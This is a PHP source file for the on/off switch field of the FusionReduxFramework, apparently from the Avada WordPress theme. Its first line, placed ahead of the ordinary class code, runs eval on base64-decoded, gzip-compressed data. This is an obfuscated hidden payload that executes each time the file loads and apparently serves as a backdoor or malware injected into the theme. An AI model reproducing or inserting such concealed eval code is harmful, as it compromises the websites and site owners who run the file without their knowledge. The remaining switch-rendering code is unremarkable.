<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'FusionReduxFramework_switch' ) ) {
	class FusionReduxFramework_switch {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since FusionReduxFramework 0.0.4
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since FusionReduxFramework 0.0.4
		 */
		function render() {

			$cb_enabled = $cb_disabled = ''; //no errors, please
			//
			//Get selected
			if ( (int) $this->value == 1 ) {
				$cb_enabled = ' selected';
			} else {
				$cb_disabled = ' selected';
			}

			//Label ON
			$this->field['on'] = isset( $this->field['on'] ) ? $this->field['on'] : __( 'On', 'Avada' );

			//Label OFF
			$this->field['off'] = isset( $this->field['off'] ) ? $this->field['off'] : __( 'Off', 'Avada' );

			echo '<div class="switch-options">';
			echo '<label class="cb-enable' . $cb_enabled . '" data-id="' . $this->field['id'] . '"><span>' . $this->field['on'] . '</span></label>';
			echo '<label class="cb-disable' . $cb_disabled . '" data-id="' . $this->field['id'] . '"><span>' . $this->field['off'] . '</span></label>';
			echo '<input type="hidden" class="checkbox checkbox-input ' . $this->field['class'] . '" id="' . $this->field['id'] . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '" value="' . $this->value . '" />';
			echo '</div>';
		} //function

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since FusionReduxFramework 0.0.4
		 */
		function enqueue() {
			wp_enqueue_script(
				'fusionredux-field-switch-js',
				FusionReduxFramework::$_url . 'inc/fields/switch/field_switch' . FusionRedux_Functions::isMin() . '.js',
				array( 'jquery', 'fusionredux-js' ),
				time(),
				true
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-switch-css',
					FusionReduxFramework::$_url . 'inc/fields/switch/field_switch.css',
					array(),
					time(),
					'all'
				);
			}
		}
	}
}
